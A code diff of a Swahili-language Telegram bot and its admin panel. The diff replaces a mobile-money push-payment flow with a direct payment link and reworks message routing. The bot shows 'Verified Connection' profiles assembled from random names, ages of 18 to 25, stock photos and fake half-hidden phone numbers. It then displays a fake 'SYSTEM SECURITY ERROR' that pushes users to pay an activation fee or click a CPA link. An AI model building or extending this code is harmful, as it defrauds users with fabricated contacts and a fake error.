@@ -1,5 +1,4 @@
 import os
-import time
 import random
 import asyncio
 import logging
@@ -13,13 +12,13 @@ from telegram import (
 )
 from telegram.ext import (
     ApplicationBuilder, ContextTypes, CommandHandler,
-    CallbackQueryHandler, MessageHandler, filters, ConversationHandler
+    CallbackQueryHandler, MessageHandler, filters
 )
 
 from database import (
     init_db, add_user, add_referral, get_referral_count, get_all_users,
     get_total_users_count, get_seen_images, add_seen_image, reset_seen_images,
-    save_order, update_order_status, get_order_details, is_user_activated,
+    get_order_details, is_user_activated,
     log_broadcast_click, get_click_count_for_url, DB_PATH
 )
 
@@ -29,15 +28,14 @@ ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "")
 ADMIN_ID = os.environ.get("ADMIN_ID", "")
 STANY_API_KEY = os.environ.get("STANY_API_KEY", "")
 STANY_BASE_URL = os.environ.get("STANY_BASE_URL", "https://host.stanymaxhub.online")
-STANY_CALLBACK_URL = os.environ.get("STANY_CALLBACK_URL", "")
 
 CPA_LINK = "https://tinyurl.com/Activebot"
+STANY_PAY_LINK = "https://nexus.stanyxpro.com/pay/connection-bot-subscription-mwpyeqqj"
 TARGET_SITE = "https://www.tanzaniaraha.com/"
 REQUIRED_CHANNEL = "@connectiontzz"
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 
-WAITING_PHONE = 1
 ADMIN_WAITING_ORDER = 2
 ADMIN_WAITING_BROADCAST = 3
 
@@ -54,44 +52,19 @@ async def check_antispam(user_id):
     return True
 
 
-def stany_request(method, path, payload=None, max_retries=3):
+def stany_request(method, path, payload=None):
     url = f"{STANY_BASE_URL.rstrip('/')}{path}"
     headers = {
         "x-api-key": STANY_API_KEY,
         "Content-Type": "application/json"
     }
-    retry_codes = {401, 402, 429}
-    delay = 1.0
-
-    for attempt in range(max_retries):
-        resp = requests.request(
-            method=method,
-            url=url,
-            headers=headers,
-            json=payload if payload is not None else None,
-            timeout=15
-        )
-        if resp.status_code in retry_codes and attempt < max_retries - 1:
-            time.sleep(delay)
-            delay *= 2
-            continue
-        return resp
-
-    return resp
-
-
-def extract_payment_ref(data, fallback_ref):
-    if not isinstance(data, dict):
-        return fallback_ref
-    for key in ("reference", "ref", "merchant_ref", "order_id", "transaction_ref", "id"):
-        if data.get(key):
-            return str(data[key])
-    nested = data.get("data") or data.get("payment") or data.get("transaction")
-    if isinstance(nested, dict):
-        for key in ("reference", "ref", "merchant_ref", "order_id", "transaction_ref", "id"):
-            if nested.get(key):
-                return str(nested[key])
-    return fallback_ref
+    return requests.request(
+        method=method,
+        url=url,
+        headers=headers,
+        json=payload if payload is not None else None,
+        timeout=15
+    )
 
 
 def extract_payment_status(data):
@@ -443,53 +416,58 @@ async def proceed_to_regions(message):
     await message.reply_text(welcome_text, parse_mode="HTML", reply_markup=get_region_keyboard())
 
 
-async def region_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def text_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not await check_antispam(str(user_id)):
         return
 
-    region = update.message.text.strip()
-    if region not in REGIONS:
+    text = update.message.text.strip()
+    if text in REGIONS:
+        hide_kb = await update.message.reply_text("<i>🔄 Inapakia taarifa za eneo lako...</i>", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
+        await asyncio.sleep(0.6)
+        await hide_kb.delete()
+
+        seen = get_seen_images(str(user_id))
+        available_images = [img for img in IMAGES if img not in seen]
+        if not available_images:
+            reset_seen_images(str(user_id))
+            available_images = IMAGES
+
+        image_url = random.choice(available_images)
+        add_seen_image(str(user_id), image_url)
+
+        name = random.choice(NAMES)
+        age = random.randint(18, 25)
+        prefix = random.choice(["07", "06"])
+        number = f"<tg-spoiler>{prefix}{random.randint(10,99)}•••{random.randint(10,99)}</tg-spoiler>"
+
+        caption = (
+            f"🔥 <b>MPYA NDANI YA {text.upper()}</b> 🔥\n\n"
+            f"💋 <b>JINA:</b> {name}\n"
+            f"🎂 <b>UMRI:</b> {age} Years\n"
+            f"📍 <b>ENEO:</b> {text}\n"
+            f"📞 <b>NAMBA YA SIMU:</b> {number}\n"
+            f"💎 <b>AINA:</b> Verified Connection\n\n"
+            "👇 <b>Bonyeza kitufe hapa chini kuunganishwa nae mara moja</b> 👇"
+        )
+
+        sent_msg = await update.message.reply_photo(
+            photo=image_url,
+            caption=caption,
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔗 KUONGANISHWA NAE", callback_data="get_connection")],
+                [InlineKeyboardButton("🔙 RUDI KWENYE MKOA", callback_data="back_to_regions")]
+            ])
+        )
+        context.user_data.setdefault('tracked_msgs', []).append((sent_msg.message_id, datetime.utcnow()))
         return
 
-    hide_kb = await update.message.reply_text("<i>🔄 Inapakia taarifa za eneo lako...</i>", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
-    await asyncio.sleep(0.6)
-    await hide_kb.delete()
-
-    seen = get_seen_images(str(user_id))
-    available_images = [img for img in IMAGES if img not in seen]
-    if not available_images:
-        reset_seen_images(str(user_id))
-        available_images = IMAGES
-
-    image_url = random.choice(available_images)
-    add_seen_image(str(user_id), image_url)
-
-    name = random.choice(NAMES)
-    age = random.randint(18, 25)
-    prefix = random.choice(["07", "06"])
-    number = f"<tg-spoiler>{prefix}{random.randint(10,99)}•••{random.randint(10,99)}</tg-spoiler>"
-
-    caption = (
-        f"🔥 <b>MPYA NDANI YA {region.upper()}</b> 🔥\n\n"
-        f"💋 <b>JINA:</b> {name}\n"
-        f"🎂 <b>UMRI:</b> {age} Years\n"
-        f"📍 <b>ENEO:</b> {region}\n"
-        f"📞 <b>NAMBA YA SIMU:</b> {number}\n"
-        f"💎 <b>AINA:</b> Verified Connection\n\n"
-        "👇 <b>Bonyeza kitufe hapa chini kuunganishwa nae mara moja</b> 👇"
-    )
-
-    sent_msg = await update.message.reply_photo(
-        photo=image_url,
-        caption=caption,
+    await update.message.reply_text(
+        "📍 <b>Chagua mkoa wako kutoka kwenye orodha hapa chini:</b>",
         parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔗 KUONGANISHWA NAE", callback_data="get_connection")],
-            [InlineKeyboardButton("🔙 RUDI KWENYE MKOA", callback_data="back_to_regions")]
-        ])
+        reply_markup=get_region_keyboard()
     )
-    context.user_data.setdefault('tracked_msgs', []).append((sent_msg.message_id, datetime.utcnow()))
 
 
 async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -591,57 +569,14 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
     elif query.data == "activation3":
         await query.message.edit_text(
-            "💳 <b>ACTIVATION YA HARAKA - TZS 3,500</b>\n\n"
-            "Tafadhali weka namba yako ya simu ya mtandao (M-Pesa, TigoPesa, AirtelMoney) ili mfumo ukututumie ombi la malipo moja kwa moja (USSD Push).\n\n"
-            "Andika namba yako hapa chini (mfano: 0712345678):",
+            "💳 <b>ACTIVATION YA HARAKA [3]</b>\n\n"
+            "Bonyeza kitufe hapa chini kufungua ukurasa wa malipo na kukamilisha activation yako. 👇",
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("💳 LIPIA SASA", url=STANY_PAY_LINK)],
                 [InlineKeyboardButton("🔙 RUDI", callback_data="back_to_error")]
             ])
         )
-        return WAITING_PHONE
-    elif query.data.startswith("check_pay_"):
-        order_ref = query.data.split("check_pay_", 1)[1]
-        status_msg = await query.message.reply_text("<i>🔄 Inakagua hali ya malipo kupitia Stany Pay...</i>", parse_mode="HTML")
-        try:
-            resp = await asyncio.to_thread(stany_request, "GET", f"/api/v1/pay/status/{order_ref}")
-            res = resp.json() if resp.content else {}
-            status = extract_payment_status(res)
-
-            if status == "SUCCESS":
-                update_order_status(order_ref, "completed")
-                await status_msg.edit_text(
-                    get_verified_success_text(),
-                    parse_mode="HTML",
-                    disable_web_page_preview=True,
-                    reply_markup=InlineKeyboardMarkup([
-                        [InlineKeyboardButton("🟢 FUNGUA TOVUTI YA CONNECTION", url=TARGET_SITE)],
-                        [InlineKeyboardButton("🔙 RUDI KWENYE MKOA", callback_data="back_to_regions")]
-                    ])
-                )
-            elif status == "FAILED":
-                update_order_status(order_ref, "failed")
-                await status_msg.edit_text(
-                    "❌ <b>MALIPO YAMESHINDWA (FAILED)</b>\n\n"
-                    "Ombi la malipo halikukamilika. Tafadhali jaribu tena au chagua njia nyingine ya activation.",
-                    parse_mode="HTML",
-                    reply_markup=InlineKeyboardMarkup([
-                        [InlineKeyboardButton("🔄 JARIBU TENA MALIPO", callback_data="activation3")],
-                        [InlineKeyboardButton("🔙 RUDI", callback_data="back_to_error")]
-                    ])
-                )
-            else:
-                await status_msg.edit_text(
-                    f"⏳ <b>MALIPO YANAENDELEA ({status})</b>\n\n"
-                    "Tafadhali thibitisha malipo kwenye simu yako kisha uguse tena kitufe cha kukagua hapa chini.",
-                    parse_mode="HTML",
-                    reply_markup=InlineKeyboardMarkup([
-                        [InlineKeyboardButton("🔄 ANGALIA TENA MALIPO", callback_data=f"check_pay_{order_ref}")],
-                        [InlineKeyboardButton("🔙 RUDI", callback_data="back_to_error")]
-                    ])
-                )
-        except Exception:
-            await status_msg.edit_text("❌ Hitilafu ya kimtandao wakati wa kuwasiliana na Stany Pay.")
     elif query.data == "back_to_error":
         await query.message.edit_text(
             "🛑 <b>SYSTEM SECURITY ERROR [ERR_AUTH_403]</b> 🛑\n\nChagua njia ya activation hapa chini 👇",
@@ -661,64 +596,6 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception:
             pass
         await query.message.reply_text("✨ <b>Chagua mkoa wako kutoka kwenye orodha hapa chini:</b>", parse_mode="HTML", reply_markup=get_region_keyboard())
-
-
-async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text.strip()
-    if text in REGIONS:
-        await update.message.reply_text("⬅️ Umerudi kwenye mkoa.", reply_markup=get_region_keyboard())
-        return ConversationHandler.END
-
-    user = update.effective_user
-    user_id = str(user.id)
-    phone = text
-
-    if not phone.startswith("0") or len(phone) < 10:
-        await update.message.reply_text("❌ Namba si sahihi. Weka namba sahihi ya simu (mfano: 0712345678) au tuma /cancel kusitisha:")
-        return WAITING_PHONE
-
-    status_msg = await update.message.reply_text("⏳ Inatuma ombi la USSD Push kwenye simu yako...")
-    merchant_ref = f"SP_{user_id}_{int(datetime.utcnow().timestamp())}"
-    customer_name = user.full_name or user.first_name or f"User {user_id}"
-
-    payload = {
-        "amount_tzs": 3500,
-        "phone": phone,
-        "customer_name": customer_name,
-        "merchant_ref": merchant_ref,
-        "callback_url": STANY_CALLBACK_URL
-    }
-
-    try:
-        resp = await asyncio.to_thread(stany_request, "POST", "/api/v1/pay/initiate", payload)
-        res_data = resp.json() if resp.content else {}
-
-        if resp.status_code in (200, 201) and res_data.get("success", True):
-            order_ref = extract_payment_ref(res_data, merchant_ref)
-            save_order(order_ref, user_id, phone, 3500, "pending")
-            await status_msg.edit_text(
-                f"📱 <b>USSD PUSH IMETUMWA!</b>\n\n"
-                f"Weka PIN kwenye simu yako kulipia TZS 3,500.\n"
-                f"Kumbukumbu: <code>{order_ref}</code>\n\n"
-                f"Baada ya kuweka PIN, bonyeza kitufe hapa chini kukagua kama malipo yamethibitishwa:",
-                parse_mode="HTML",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🔄 ANGALIA HALI YA MALIPO", callback_data=f"check_pay_{order_ref}")],
-                    [InlineKeyboardButton("🔙 RUDI KWENYE MKOA", callback_data="back_to_regions")]
-                ])
-            )
-        else:
-            err_msg = res_data.get("message") or res_data.get("error") or f"HTTP {resp.status_code}"
-            await status_msg.edit_text(f"❌ Imeshindikana: {err_msg}")
-    except Exception:
-        await status_msg.edit_text("❌ Hitilafu ya kimtandao wakati wa kuunganishwa na Stany Pay.")
-
-    return ConversationHandler.END
-
-
-async def cancel_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("❌ Imesitishwa.", reply_markup=get_region_keyboard())
-    return ConversationHandler.END
 
 
 # --- ADMIN PANEL ---
@@ -789,14 +666,15 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI", callback_data="admin_home")]])
         )
     elif query.data == "admin_check_order":
+        context.user_data["admin_awaiting"] = ADMIN_WAITING_ORDER
         await query.message.edit_text(
             "🔍 <b>ANGALIA ORDER YA MALIPO</b>\n\n"
             "Tafadhali tuma Order Ref (mfano: SP_123456_1740000000) kwenye chat hii kukagua hali yake kwenye Stany Pay:",
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI", callback_data="admin_home")]])
         )
-        return ADMIN_WAITING_ORDER
     elif query.data == "admin_broadcast_prompt":
+        context.user_data["admin_awaiting"] = ADMIN_WAITING_BROADCAST
         total_recipients = get_total_users_count()
         await query.message.edit_text(
             f"📢 <b>MFUMO WA KUTUMA MATANGAZO (BROADCAST HUB)</b>\n\n"
@@ -808,7 +686,6 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI", callback_data="admin_home")]])
         )
-        return ADMIN_WAITING_BROADCAST
     elif query.data == "admin_clean":
         await query.message.edit_text(
             "🔄 <b>USAFISHAJI WA MFUMO</b>\n\n"
@@ -818,6 +695,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI", callback_data="admin_home")]])
         )
     elif query.data == "admin_home":
+        context.user_data.pop("admin_awaiting", None)
         total_users = get_total_users_count()
         await query.message.edit_text(
             f"👑 <b>Tanzania Connection - Master Admin Panel</b>\n\n"
@@ -835,9 +713,22 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
 
+async def admin_message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if str(update.effective_user.id) != str(ADMIN_ID):
+        return
+
+    state = context.user_data.get("admin_awaiting")
+    if state == ADMIN_WAITING_ORDER:
+        context.user_data.pop("admin_awaiting", None)
+        await admin_receive_order(update, context)
+    elif state == ADMIN_WAITING_BROADCAST:
+        context.user_data.pop("admin_awaiting", None)
+        await admin_receive_broadcast_content(update, context)
+
+
 async def admin_receive_order(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if str(update.effective_user.id) != str(ADMIN_ID):
-        return ConversationHandler.END
+        return
     order_ref = update.message.text.strip()
     order_data = get_order_details(order_ref)
 
@@ -867,13 +758,12 @@ async def admin_receive_order(update: Update, context: ContextTypes.DEFAULT_TYPE
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI KUBWA", callback_data="admin_home")]])
         )
-    return ConversationHandler.END
 
 
 # --- DIRECT URL BROADCAST PREVIEW & RE-UPLOAD WORKFLOW ---
 async def admin_receive_broadcast_content(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if str(update.effective_user.id) != str(ADMIN_ID):
-        return ConversationHandler.END
+        return
 
     msg = update.message
     context.user_data['broadcast_msg_obj'] = msg
@@ -917,7 +807,6 @@ async def admin_receive_broadcast_content(update: Update, context: ContextTypes.
             [InlineKeyboardButton("❌ GHAIRI / SITISHA", callback_data="admin_cancel_broadcast")]
         ])
     )
-    return ConversationHandler.END
 
 
 async def admin_confirm_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE, main_app):
@@ -1050,44 +939,18 @@ async def main():
     main_app = ApplicationBuilder().token(MAIN_BOT_TOKEN).build()
     admin_app = ApplicationBuilder().token(ADMIN_BOT_TOKEN).build()
 
-    conv_handler = ConversationHandler(
-        entry_points=[CallbackQueryHandler(handle_callback, pattern="^activation3$")],
-        states={
-            WAITING_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)]
-        },
-        fallbacks=[CommandHandler("cancel", cancel_phone)]
-    )
-
-    admin_conv_handler = ConversationHandler(
-        entry_points=[CallbackQueryHandler(admin_callback, pattern="^admin_check_order$")],
-        states={
-            ADMIN_WAITING_ORDER: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_receive_order)]
-        },
-        fallbacks=[]
-    )
-
-    admin_broadcast_conv = ConversationHandler(
-        entry_points=[CallbackQueryHandler(admin_callback, pattern="^admin_broadcast_prompt$")],
-        states={
-            ADMIN_WAITING_BROADCAST: [MessageHandler(filters.ALL & ~filters.COMMAND, admin_receive_broadcast_content)]
-        },
-        fallbacks=[]
-    )
-
     # Main Bot Handlers
     main_app.add_handler(CommandHandler("start", start))
     main_app.add_handler(CallbackQueryHandler(age_callback, pattern="^age_"))
-    main_app.add_handler(conv_handler)
     main_app.add_handler(CallbackQueryHandler(handle_callback))
-    main_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, region_click))
+    main_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_message_handler))
 
     # Admin Bot Handlers
     admin_app.add_handler(CommandHandler("start", admin_start))
-    admin_app.add_handler(admin_conv_handler)
-    admin_app.add_handler(admin_broadcast_conv)
     admin_app.add_handler(CallbackQueryHandler(lambda u, c: admin_confirm_broadcast_callback(u, c, main_app), pattern="^admin_confirm_broadcast$"))
     admin_app.add_handler(CallbackQueryHandler(admin_cancel_broadcast_callback, pattern="^admin_cancel_broadcast$"))
     admin_app.add_handler(CallbackQueryHandler(admin_callback))
+    admin_app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, admin_message_router))
 
     await main_app.initialize()
     await admin_app.initialize()
